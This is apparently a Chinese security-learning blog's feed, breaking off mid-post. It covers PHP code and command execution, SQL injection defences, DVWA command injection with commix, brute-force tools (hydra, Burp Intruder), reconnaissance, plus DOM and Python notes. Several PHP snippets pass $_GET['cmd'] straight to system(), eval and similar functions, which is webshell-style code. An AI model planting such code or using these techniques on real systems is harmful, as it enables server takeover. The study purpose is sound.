class="hljs-keyword">echo</span> <span class="hljs-string">"?code=[phpinfo()]"</span>;    &#125;<span class="hljs-meta">?&gt;</span></code></pre><p>测试失败，传入?code=[phpinfo()]之后，页面仍未执行代码</p></li><li><p>回调函数<br>call_user_func()具有两个参数，第一个参数是要执行的函数，第二个参数是要执行的函数的参数</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myeval</span><span class="hljs-params">($cmd)</span></span>&#123;        <span class="hljs-keyword">eval</span>($cmd);    &#125;    $c=$_GET[<span class="hljs-string">'cmd'</span>];    call_user_func(<span class="hljs-string">'myeval'</span>,$c);<span class="hljs-meta">?&gt;</span></code></pre><p>可以传入?cmd=phpinfo(); 成功执行</p></li><li><p>动态函数<br>PHP中，函数可以直接由字符串拼接</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    $_GET[<span class="hljs-string">'a'</span>]($_GET[<span class="hljs-string">'b'</span>]);<span class="hljs-meta">?&gt;</span></code></pre><p>?a=assert&amp;b=phpinfo()</p></li></ol><h2 id="03-漏洞防范"><a href="#03-漏洞防范" class="headerlink" title="03 漏洞防范"></a>03 漏洞防范</h2><ol><li>尽量不使用eval、assert等函数，在disable_funtions中禁止</li><li>对输入进行严格的限制</li><li>preg_replace不使用/e修饰符</li></ol>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>代码执行</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入 漏洞防范</title>
    <link href="/SQL%E6%B3%A8%E5%85%A5-%E6%BC%8F%E6%B4%9E%E9%98%B2%E8%8C%83/"/>
    <url>/SQL%E6%B3%A8%E5%85%A5-%E6%BC%8F%E6%B4%9E%E9%98%B2%E8%8C%83/</url>
    
    <content type="html"><![CDATA[<p>PHP中几种防范SQL注入的函数</p><a id="more"></a><h1 id="SQL注入漏洞防范"><a href="#SQL注入漏洞防范" class="headerlink" title="SQL注入漏洞防范"></a>SQL注入漏洞防范</h1><h2 id="01-GPC-runtime-魔术引号"><a href="#01-GPC-runtime-魔术引号" class="headerlink" title="01 GPC/runtime 魔术引号"></a>01 GPC/runtime 魔术引号</h2><p>magic_quotes_gpc()对GET、POST、COOKIE的值进行过滤</p><p>magic_quotes_runtime()对从数据库或者文件中获取的数据进行过滤</p><p>这两个函数只能对单引号、双引号、反斜杠、空字符进行过滤，对int型的注入作用不大</p><p>PHP4.2.3之前可以在任何地方设置开启，之后的版本可以在php.ini、httpd.conf、.htaccess中开启</p><h2 id="02-过滤类"><a href="#02-过滤类" class="headerlink" title="02 过滤类"></a>02 过滤类</h2><ol><li><p>addslashes<br>对单引号、双引号、反斜杠、空字符进行转义，参数必须是string类型</p></li><li><p>mysql_escape_string<br>转义字符有\x00, \n, \r, , ‘, “, \x1a</p></li><li><p>mysql_real_escape_string（更推荐）</p><p>过滤字符同上，不同之处在于接受的是一个连接句柄，并根据当前字符集转义字符串</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  $con = mysql_connect(<span class="hljs-string">"localhost"</span>,<span class="hljs-string">"root"</span>,<span class="hljs-string">"123456"</span>);$id = mysql_real_escape_string($_GET[<span class="hljs-string">'id'</span>],$con);$sql = <span class="hljs-string">"select * from table where id='"</span>.$id.<span class="hljs-string">"'"</span>;<span class="hljs-keyword">echo</span> $sql;<span class="hljs-meta">?&gt;</span></code></pre></li><li><p>intval<br>将变量转换成int类型，适用于int型注入</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  $id = intval(<span class="hljs-string">"1 union select"</span>);<span class="hljs-keyword">echo</span> $id;<span class="hljs-meta">?&gt;</span></code></pre><p>输出结果为 1 </p><p>类似的还有floatval等函数</p></li></ol><h2 id="03-PDO-prepare预编译"><a href="#03-PDO-prepare预编译" class="headerlink" title="03 PDO prepare预编译"></a>03 PDO prepare预编译</h2><p>将sql参数使用？代替，作为占位符</p><p>输入的值只作为参数，而不去拼接SQL语句</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  dbh = <span class="hljs-keyword">new</span> PDO(<span class="hljs-string">"mysql:host=localhost; dbname=demo"</span>, <span class="hljs-string">"user"</span>, <span class="hljs-string">"pass"</span>);$dbh-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES,<span class="hljs-keyword">false</span>);$dbh-&gt;exec(<span class="hljs-string">"set names 'gbk'"</span>);$sql = <span class="hljs-string">"select * from test where name = ? and password = ? "</span>;$stmt = $dbh-&gt;prepare($sql);$exeres = $stmt-&gt;execute(<span class="hljs-keyword">array</span>($name,$pass));<span class="hljs-meta">?&gt;</span></code></pre><p>预编译除了可以避免SQL注入，还可以提高SQL语句的复用</p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>代码审计</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP命令执行漏洞简介</title>
    <link href="/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/"/>
    <url>/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<p>简单总结并验证命令执行漏洞</p><a id="more"></a><h1 id="PHP命令执行漏洞"><a href="#PHP命令执行漏洞" class="headerlink" title="PHP命令执行漏洞"></a>PHP命令执行漏洞</h1><h2 id="01-命令执行简介"><a href="#01-命令执行简介" class="headerlink" title="01 命令执行简介"></a>01 命令执行简介</h2><ol><li>命令执行的原理及成因<br>程序员使用脚本语言（如PHP）进行开发时，需要调用一些外部程序（系统命令或可执行文件），在调用这些命令时，如果将用户的输入作为系统命令的参数拼接到命令行中，并且没有对用户的输入进行过滤，就会造成命令执行漏洞。<br>可以总结为两点：<ul><li>用户输入拼接到系统命令中执行</li><li>用户输入未经过过滤(命令不再执行)或净化(去除敏感字,命令继续执行)</li></ul></li><li>漏洞危害<ul><li>继承web服务器权限，执行系统命令</li><li>继承web服务器权限，读写文件</li><li>反弹shell</li><li>控制网站和服务器</li></ul></li></ol><h2 id="02-命令执行的相关函数"><a href="#02-命令执行的相关函数" class="headerlink" title="02 命令执行的相关函数"></a>02 命令执行的相关函数</h2><p>测试前，首先要检查以下函数是否在php.ini中被’disable_functions=’禁止</p><ol><li>system()<br>将字符串作为系统命令执行，并且输出结果</li></ol><p>执行命令成功则返回true，否则返回false<br>   测试代码如下：</p>   <pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'cmd'</span>]))&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;'</span>;    system($_GET[<span class="hljs-string">'cmd'</span>]);&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">'no cmd input !'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>GET方式传入参数cmd=whoami，成功执行命令<br>   <img src="/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/1.png" srcset="/img/loading.gif" alt></p><p><img src="/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/2.png" srcset="/img/loading.gif" alt></p><ol start="2"><li><p>shell_exec()<br>将字符串作为系统命令执行，不输出结果<br>测试代码如下：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'cmd'</span>]))&#123;    <span class="hljs-keyword">print</span> shell_exec($_GET[<span class="hljs-string">'cmd'</span>]);&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">'no cmd input !'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>结果与system()，但没有使用&lt;pre&gt;标签，格式有所不同</p></li><li><p>exec()<br>将字符串作为系统命令执行，返回结果最后一行<br>如果添加第二个参数$array，就将每一行结果存入数组之中<br>测试代码如下：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'cmd'</span>]))&#123;    exec($_GET[<span class="hljs-string">'cmd'</span>],$array);    print_r($array);&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">'no cmd input !'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>执行whoami命令结果如下</p></li></ol><p><img src="/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/1.png" srcset="/img/loading.gif" alt></p><p><img src="/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/3.png" srcset="/img/loading.gif" alt></p><ol start="4"><li><p>passthru()<br>与system()类似，将字符串作为系统命令执行，并且输出结果<br>无返回值，可以输出二进制数据<br>测试代码如下：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'cmd'</span>]))&#123;    passthru($_GET[<span class="hljs-string">'cmd'</span>]);&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">'no cmd input !'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></li><li><p>popen()<br>执行命令不返回命令结果，而是返回一个文件指针（需要有写权限）<br>测试代码如下：</p> <pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'cmd'</span>]))&#123;    $cmd=$_GET[<span class="hljs-string">'cmd'</span>].<span class="hljs-string">"&gt;&gt; 1.txt"</span>;    popen($cmd,r);&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">'no cmd input !'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>执行whoami命令之后，生成了一个1.TXT文件，内容为命令结果<br><img src="/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/4.png" srcset="/img/loading.gif" alt></p></li><li><p>反引号<br>反引号``内的字符串会被当做系统命令执行</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'cmd'</span>]))&#123;    $cmd=$_GET[<span class="hljs-string">'cmd'</span>];  <span class="hljs-keyword">print</span> `$cmd`;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">'no cmd input !'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>同样可以执行系统命令</p></li></ol><h2 id="03-DVWA中的命令执行漏洞"><a href="#03-DVWA中的命令执行漏洞" class="headerlink" title="03 DVWA中的命令执行漏洞"></a>03 DVWA中的命令执行漏洞</h2><p>输入一个IP地址，即可执行ping命令</p><p><img src="/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/5.png" srcset="/img/loading.gif" alt></p><p>源码：<br><img src="/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/6.png" srcset="/img/loading.gif" alt></p><p>我们可以使用拼接的方法执行其他命令<br>如图，同时执行了ping和whoami命令</p><p><img src="/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/7.png" srcset="/img/loading.gif" alt></p><p>可以使用自动化工具commix直接获取网站shell<br>commix -u “<a href="http://127.0.0.1/cmd.php?cmd=127.0.0.1&quot;" target="_blank" rel="noopener">http://127.0.0.1/cmd.php?cmd=127.0.0.1&quot;</a></p><h2 id="04-拼接符介绍"><a href="#04-拼接符介绍" class="headerlink" title="04 拼接符介绍"></a>04 拼接符介绍</h2><ul><li>windows下的拼接符：<ul><li>&amp; 前面语句为假则直接执行后边的</li><li>&amp;&amp; 前面的语句为假就终止执行</li><li>| 直接执行后边的语句</li><li>|| 前面出错执行后边的</li></ul></li><li>linux下的拼接符：<ul><li>；前面执行完执行后边的</li><li>&amp; 无论前边的语句真假都会执行</li><li>&amp;&amp; 只有前面语句为真，才会执行后边语句</li><li>|显示后边的执行结果</li><li>|| 前面出错执行后边的</li></ul></li></ul><h2 id="05-漏洞防范"><a href="#05-漏洞防范" class="headerlink" title="05 漏洞防范"></a>05 漏洞防范</h2><ol><li>减少相关函数的使用，并在disable_functions中禁用函数</li><li>执行命令前对参数进行过滤如escapeshellcmd(),escapeshellarg()</li><li>参数的值使用引号包裹，并使用addslashes函数转义</li><li>对参数设置白名单</li></ol>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>代码审计</tag>
      
      <tag>命令执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BOM与DOM</title>
    <link href="/BOM%E4%B8%8EDOM/"/>
    <url>/BOM%E4%B8%8EDOM/</url>
    
    <content type="html"><![CDATA[<p>BOM与DOM的概念介绍</p><a id="more"></a><h1 id="BOM与DOM"><a href="#BOM与DOM" class="headerlink" title="BOM与DOM"></a>BOM与DOM</h1><h2 id="01-BOM"><a href="#01-BOM" class="headerlink" title="01 BOM"></a>01 BOM</h2><p>浏览器对象模型<br>浏览器中的一个窗口就是一个BOM</p><p><img src="/BOM%E4%B8%8EDOM/1.png" srcset="/img/loading.gif" alt></p><h3 id="window对象"><a href="#window对象" class="headerlink" title="window对象"></a>window对象</h3><p>一般情况下，window都可以省略<br>所有的属性、方法变量前都可以加上window，也可以省略</p><ul><li>window.alert(‘hello’);</li><li>confirm(‘确认框’);<br>点击确认时返回ture，取消返回false</li><li>prompt(‘输入框’);<br>第一个参数，面板上的显示内容<br>第二个参数（可选），默认值<br>返回值为输入的内容，无输入时返回null</li><li>open(url, name, string)<br>第一个参数，跳转的URL<br>第二个参数，给打开的窗口命名<br>第三个参数，一个特殊的字符串，可以设置新打开窗口的属性</li></ul><h3 id="history对象"><a href="#history对象" class="headerlink" title="history对象"></a>history对象</h3><p>当前窗口（而非浏览器）的历史记录，不同URL会产生不同的历史记录</p><ul><li>属性<br>history.length 输出当前窗口历史记录的条数</li><li>方法<ul><li>history.back() 与在浏览器点击后退按钮相同</li><li>history.forward() 与在浏览器点击后退按钮相同</li><li>history.go()<br>参数 ：0 刷新当前页面<pre><code>正数 前进n页负数 后退n页</code></pre></li></ul></li></ul><h3 id="location对象"><a href="#location对象" class="headerlink" title="location对象"></a>location对象</h3><p><strong>URL 统一资源定位符</strong><br>协议://IP(域名)/:端口号/路径/?查询字符串#锚点<br>protocol://hostname:port/pathname/?search#hash</p><ul><li>属性<ul><li>location.protocol 输出协议</li><li>location.hostname 输出主机名</li><li>location.pathname 输出路径和文件名</li><li>location.port 输出端口，一般是隐藏的</li><li>location.search 输出查询字符串，使用？开头，&amp;连接</li><li>location.hash 输出锚点</li></ul></li></ul><p>使用location输出的是对象，location.href输出的是字符串</p><p>window.location === window.document.location</p><ul><li>方法<ul><li>location.assign(url) 在当前窗口跳转到URL</li><li>location.replace(url) 在当前窗口替换成新的URL(不产生历史记录)</li><li>location.reload() 刷新当前窗口，添加参数true时不经过缓存，强制从服务器重载</li></ul></li></ul><h2 id="02-DOM"><a href="#02-DOM" class="headerlink" title="02 DOM"></a>02 DOM</h2><p>文档对象模型 document object model</p><p><img src="https://www.runoob.com/images/pic_htmltree.gif" srcset="/img/loading.gif" alt="DOM HTML tree"></p><ul><li>节点类型：<ul><li>元素节点  <div></div></li><li>属性节点 id=’div1’</li><li>文本节点 div文本</li></ul></li><li>节点的属性：<ul><li>innerHTML - 节点（元素）的文本值</li><li>parentNode - 节点（元素）的父节点</li><li>childNodes - 节点（元素）的子节点</li><li>attributes - 节点（元素）的属性节点</li></ul></li><li>元素节点的获取<ul><li>document .getElementById(“div1”);<br>功能：通过id获取符合条件的元素节点（id必须是唯一的）<br>返回值：符合条件的一个节点</li><li>document .getElementByName(name属性的值);<br>功能：通过name属性的值获取符合条件的元素节点<br>只能从全局即document开始，一般用在表单元素中</li><li>node.getElementByTagName(标签名);<br>功能：从node节点开始，通过标签名获取符合条件的元素节点<br>返回值：与数组类似，一般叫做伪数组或类数组</li><li>node.getElementByClassName(class名);<br>功能：从node节点开始，通过class名获取符合条件的元素节点<br>IE8以下不兼容</li><li>document.querySelector(字符串)<br>参数：css选择器格式字符串<br>返回值：符合条件的第一个节点</li><li>document.querySelectorAll(字符串)<br>参数：css选择器格式字符串<br>返回值：伪数组</li></ul></li><li>修改HTML元素<ul><li>document.getElementById(“p1”).innerHTML=”新文本!”;<br>改变一个 &lt;p&gt; 元素的 HTML 内容</li><li>document.getElementById(“p2”).style.color=”blue”;<br>改变一个段落的 HTML 样式</li><li>var node=document.createTextNode(“这是一个新段落。”); para.appendChild(node);<br>如需向 HTML DOM 添加新元素，您首先必须创建该元素（元素节点），然后把它追加到已有的元素上。</li><li>appendChild(node);<br>插入新的子节点（元素）</li><li>removeChild(node);<br>删除子节点（元素）</li></ul></li><li>DOM事件<ul><li>onclick=<em>JavaScript</em><br>当点击时执行js代码</li><li>onload=<em>JavaScript</em><br>当加载网页时执行js代码</li><li>onunload=<em>JavaScript</em><br>当离开网页时执行js代码</li><li>onchange=<em>JavaScript</em><br>当改变输入字段的内容时执行js代码</li><li>onmouseover=<em>JavaScript</em><br>当鼠标悬浮在此处时执行js代码</li><li>onmouseout=<em>JavaScript</em><br>当鼠标离开此处时执行js代码</li><li>onmousedown=<em>JavaScript</em><br>当鼠标按下时执行js代码</li><li>onmouseup=<em>JavaScript</em><br>当鼠标松开时执行js代码</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>暴力破解</title>
    <link href="/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    <url>/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>暴力破解的简单总结</p><a id="more"></a><h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="01-暴力破解原理"><a href="#01-暴力破解原理" class="headerlink" title="01 暴力破解原理"></a>01 暴力破解原理</h2><p>用户使用自定义字典文件中的内容与验证程序交互，从而在枚举过程中得到正确数据，如破解用户名、密码，破解验证码</p><p>暴力破解的基础：</p><ol><li>应用程序或服务器未进行限制</li><li>具有内容涵盖全面的字典文件</li></ol><p>口令的隐患：</p><ol><li>弱口令<br>123456，password，姓名+生日等</li><li>默认口令<br>admin，root等</li><li>明文传输<br>HTTP，FTP，TELNET等数据流都是明文传递的</li></ol><h2 id="02-字典"><a href="#02-字典" class="headerlink" title="02 字典"></a>02 字典</h2><ol><li><p>常见的字典有：</p><ul><li><p>弱口令字典 </p></li><li><p>社工字典</p></li><li><p>子域名字典</p></li><li><p>默认口令字典</p></li><li><p>文件目录字典</p></li><li><p>常用变量名字典</p></li></ul></li><li><p>字典制作工具：</p><ul><li><p>cupp 需要使用python3运行</p><ul><li>-h 显示帮助信息</li><li>-i 以交互的方式制作用户密码字典文件</li><li>-w Filename 使用此选项配置现有字典</li><li>-l 从仓库下载大型字典文件</li><li>-a 直接从Alecto DB解析默认用户名和密码</li><li>-v 显示版本信息</li></ul></li><li><p>pydictor 兼容python2和3<br> <a href="https://github.com/LandGrey/pydictor/blob/master/README_CN.md" target="_blank" rel="noopener">帮助信息</a></p></li><li><p>dymerge</p><p>dymerge用来操作多个已有字典，重塑合并的工具</p><p>使用方法：</p><ul><li><strong>合并两个字典文件</strong> ./dymerge.py dic1.txt dic2.txt</li><li><strong>删除重复项</strong>./dymerge.py dic1.txt dic2.txt -u</li><li><strong>逆向字典</strong>./dymerge.py dic1.txt dic2.txt -r</li><li><strong>字母和数字排序</strong>./dymerge.py dic1.txt dic2.txt -s</li><li>-o 指定输出的文件名和目标</li><li>-z 定义为文件压缩输出</li></ul></li><li><p>crunch<br>在kali中自带,命令格式如下：</p><p>crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options]</p></li></ul></li></ol><h2 id="03-破解工具"><a href="#03-破解工具" class="headerlink" title="03 破解工具"></a>03 破解工具</h2><ol><li><p>hydra</p><ul><li>-l 指定一个用户名</li><li>-p 指定一个密码</li><li>-L 指定用户名字典</li><li>-P 指定密码字典</li><li>-vV 显示爆破细节</li><li>-o 保存爆破结果</li><li>-f 找到正确的密码就停止爆破</li><li>-t 设置线程，默认为16</li><li>-e<ul><li>n null</li><li>s same</li><li>r 反向</li></ul></li></ul></li><li><p>burpsuite<br>抓包后使用intruder模块进行破解，共有四种爆破模式</p><ul><li><p>Sniper（狙击手）<br>如果设置了1个参数就依次尝试payload<br>如果设置了两个参数，先爆破第一个，第二个不变；再爆破第二个，第一个不变</p></li><li><p>Battering ram（攻城锤）<br>如果设置了1个参数就依次尝试payload<br>如果设置了两个参数，使用同样的payload同时对两个参数进行爆破</p></li><li><p>Pitchfork（草叉）<br>至少要两个参数，假设第一个参数payload为1，2，3，第二个参数payload为a，b，c，第一次爆破为1，a，第二次爆破为2，b，第三次爆破为3，c<br>如果两个参数的payload数量不同，取较小的值</p></li><li><p>Cluster bomb（集束炸弹）</p><p>取笛卡尔积<br>至少要两个参数，假设第一个参数payload为1，2，3，第二个参数payload为a，b，c，第一次爆破为1，a，第二次爆破为1，b，第三次爆破为1，c，第四次为2，a…以此类推，共9次</p></li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python collections几个集合类</title>
    <link href="/python-collections%E5%87%A0%E4%B8%AA%E9%9B%86%E5%90%88%E7%B1%BB/"/>
    <url>/python-collections%E5%87%A0%E4%B8%AA%E9%9B%86%E5%90%88%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<p>python collections库提供了一些方便的集合类</p><a id="more"></a><h1 id="python-collections"><a href="#python-collections" class="headerlink" title="python collections"></a>python collections</h1><ol><li><p>namedtuple(‘名称’,[属性list])</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> collectionsPoint=collections.namedtuple(<span class="hljs-string">'Point'</span>,[<span class="hljs-string">'x'</span>,<span class="hljs-string">'y'</span>])p=Point(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)print(<span class="hljs-string">'x ='</span>,p.x)print(<span class="hljs-string">'y ='</span>,p.y)<span class="hljs-comment">#x = 1</span><span class="hljs-comment">#y = 2</span></code></pre></li><li><p>duque<br>为了实现高效插入和删除操作的双向列表，适合用于队列和栈</p><pre><code class="hljs python">q=collections.deque([<span class="hljs-string">'a'</span>,<span class="hljs-string">'b'</span>,<span class="hljs-string">'c'</span>])q.append(<span class="hljs-string">'x'</span>)q.appendleft(<span class="hljs-string">'y'</span>)print(q)q.pop()q.popleft()print(q)<span class="hljs-comment">#deque(['y', 'a', 'b', 'c', 'x'])</span><span class="hljs-comment">#deque(['a', 'b', 'c'])</span></code></pre></li><li><p>defaultdict<br>可以设置字典key不存在时返回的默认值<br>dd=defaultdict(lambda:’Not exist’)<br>若key不存在就将返回Not exist</p><pre><code class="hljs python">dd=collections.defaultdict(<span class="hljs-keyword">lambda</span>:<span class="hljs-string">'Not exist'</span>)dd[<span class="hljs-string">'a'</span>]=<span class="hljs-number">1</span>print(dd[<span class="hljs-string">'a'</span>])print(dd[<span class="hljs-string">'b'</span>])<span class="hljs-comment">#1</span><span class="hljs-comment">#Not exist</span></code></pre></li><li><p>OrderedDict<br>按照key插入顺序排序，使字典变的有序</p><pre><code class="hljs python">od=collections.OrderedDict([(<span class="hljs-string">'c'</span>,<span class="hljs-number">1</span>),(<span class="hljs-string">'a'</span>,<span class="hljs-number">2</span>),(<span class="hljs-string">'b'</span>,<span class="hljs-number">3</span>)])print(od)print(od.keys())print(od.values())print(od[<span class="hljs-string">'a'</span>])<span class="hljs-comment">#OrderedDict([('c', 1), ('a', 2), ('b', 3)])</span><span class="hljs-comment">#odict_keys(['c', 'a', 'b'])</span><span class="hljs-comment">#odict_values([1, 2, 3])</span><span class="hljs-comment">#2</span></code></pre></li><li><p>Counter<br>用于统计字符串中每个字符出现的次数，区分大小写，空格也会被统计</p><pre><code class="hljs python">c=collections.Counter()text=<span class="hljs-string">'Hello John'</span><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> text:    c[ch]+=<span class="hljs-number">1</span>print(c)<span class="hljs-comment">#Counter(&#123;'l': 2, 'o': 2, 'H': 1, 'e': 1, ' ': 1, 'J': 1, 'h': 1, 'n': 1&#125;)</span></code></pre></li></ol>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>几种信息收集方式</title>
    <link href="/%E5%87%A0%E7%A7%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%96%B9%E5%BC%8F/"/>
    <url>/%E5%87%A0%E7%A7%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>本文总结了Google Hacking、whois等常用的信息收集方式</p><a id="more"></a><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>信息收集主要针对目标的服务器系统、数据库系统、中间件系统、应用程序系统、以及边界设备等信息。以及针对系统管理员的信息收集。</p><p>信息收集的分类：</p><ol><li>主动信息收集：直接与目标进行交互，在交互过程中进行收集，如nmap、burpsuite站点地图收集</li><li>被动信息收集：通过第三方引擎与目标交互，或不与目标交互查询具体数据库，如googlehacking、shodan查询等</li></ol><h2 id="01-Google-Hacking"><a href="#01-Google-Hacking" class="headerlink" title="01 Google Hacking"></a>01 Google Hacking</h2><table><thead><tr><th>关键字</th><th>含义</th><th>举例</th></tr></thead><tbody><tr><td>site</td><td>指定搜索域名</td><td>Site:baidu.com</td></tr><tr><td>inurl</td><td>指定URL中是否存在某些关键字</td><td>Inure:.php?id=</td></tr><tr><td>intext</td><td>指定网页中是否存在某些关键字</td><td>Intext:网站管理</td></tr><tr><td>filetype</td><td>指定搜索文件类型</td><td>Filetype:txt</td></tr><tr><td>intitle</td><td>指定网页标题中是否存在某些关键字</td><td>Intitle:后台管理</td></tr><tr><td>link</td><td>指定网页链接</td><td>Link:baidu.com(指定与百度做了外链的站点)</td></tr><tr><td>Info</td><td>指定网页信息</td><td>Info:baidu.com</td></tr></tbody></table><h2 id="02-Whois"><a href="#02-Whois" class="headerlink" title="02 Whois"></a>02 Whois</h2><p>用于查询域名的IP以及所有者的详细信息，不同后缀名的域名需要使用不同的Whois信息，使用43端口、TCP</p><p>可以使用web接口或者命令行的方式进行查询 whois url</p><h2 id="03-子域名查询"><a href="#03-子域名查询" class="headerlink" title="03 子域名查询"></a>03 子域名查询</h2><p>subdomian name，顶级域名前加前缀的都是子域名<br>我国顶级域名 .cn 也是我国的一级域名<br>二级域名分为类别域名和行政区域名，类别域名有6个：科研机构.ac 工商金融企业.com 教育机构.edu 政府部门.gov 互联网络信息中心和运行中心.net 非盈利组织.org<br>行政区域名有34个</p><p><strong><em>主域名不存在漏洞时可以从子域名靠近主域名</em></strong></p><p>查询方式：</p><ol><li>maltego CE,wydomain,subDomainsBrute,dbsmaper,Layer子域名挖掘机</li><li>搜索引擎挖掘 google hack，输入site：sina.com</li><li>第三方网站查询  <a href="https://phpinfo.me/domain" target="_blank" rel="noopener">https://phpinfo.me/domain</a> , <a href="http://dns.aizhan,.com" target="_blank" rel="noopener">http://dns.aizhan,.com</a></li><li>证书透明度公开日志枚举 <a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a>  , <a href="http://censys.io/" target="_blank" rel="noopener">http://censys.io/</a></li></ol><h2 id="04-CDN"><a href="#04-CDN" class="headerlink" title="04 CDN"></a>04 CDN</h2><ol><li><p>CDN介绍<br>CDN（content delivery network）内容分发网络</p><p>无数据交互时根据用户所在地区访问相应的缓存服务器，只有需要交互时才访问真实的服务器</p></li><li><p>判断CDN是否存在一般存在于大型网络</p><p>通过ping判断是否存在 ping <a href="http://www.baihe.com" target="_blank" rel="noopener">www.baihe.com</a></p><p>通过设置代理或者利用在线ping网站使用不同地区的服务器进行ping操作</p></li><li><p>绕过CDN</p></li></ol><ul><li>如果目标没有使用CDN可以直接使用ping获取IP<br> 或者使用在线网站<a href="http://www.ip138.com" target="_blank" 